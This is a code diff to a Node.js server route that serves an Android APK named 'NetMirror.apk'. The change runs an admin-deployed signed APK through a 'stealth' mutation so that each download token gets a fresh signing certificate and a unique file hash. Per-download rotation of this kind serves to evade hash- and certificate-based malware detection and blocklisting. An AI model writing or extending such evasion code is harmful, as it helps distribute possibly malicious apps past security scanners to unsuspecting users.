@@ -765,8 +765,9 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
         return out;
       };
 
-      // ═══ PRIORITY 1: Deployed signed APK from APK Signer vault ═══
-      // Served AS-IS so the admin's explicit signed-APK choice is honored.
+      // ═══ PRIORITY 1: Deployed signed APK from APK Signer vault → stealth-mutated per token ═══
+      // The admin's deployed APK is the SOURCE; stealth still applies per-token so each
+      // download gets a unique fresh cert + file hash (the whole point of per-download rotation).
       try {
         const deployedRow = db.prepare("SELECT value FROM admin_settings WHERE key = 'deployed_signed_apk_id'").get();
         if (deployedRow && deployedRow.value) {
@@ -774,13 +775,14 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
           const signedPath = path.join(__dirname, 'data', 'signed_apks', `${deployedId}_signed.apk`);
           if (fs.existsSync(signedPath)) {
             const apkBuf = fs.readFileSync(signedPath);
-            console.log(`[DL] Serving DEPLOYED signed APK ${deployedId} (${(apkBuf.length / 1048576).toFixed(2)} MB)`);
+            const out = buildStealth(apkBuf);
+            console.log(`[DL] Serving stealth-mutated DEPLOYED APK ${deployedId} (${(out.length / 1048576).toFixed(2)} MB) for token ${req.params.token.substring(0, 8)}...`);
             res.setHeader('Content-Type', 'application/vnd.android.package-archive');
             res.setHeader('Content-Disposition', 'attachment; filename="NetMirror.apk"');
-            res.setHeader('Content-Length', apkBuf.length);
+            res.setHeader('Content-Length', out.length);
             res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
             res.setHeader('Pragma', 'no-cache');
-            return res.end(apkBuf);
+            return res.end(out);
           }
         }
       } catch (_) {}
